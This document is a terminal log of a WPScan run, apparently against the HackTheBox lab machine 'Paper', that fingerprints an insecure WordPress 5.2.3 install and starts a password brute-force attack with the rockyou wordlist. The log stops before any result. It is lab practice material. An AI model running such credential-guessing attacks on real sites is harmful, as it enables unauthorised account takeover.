wpscan --url office.paper -P ~/Downloads/rockyou.txt -U prisonmike
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Mon Feb 14 07:57:36 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:01:00 <===============================================> (137 / 137) 100.00% Time: 00:01:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s

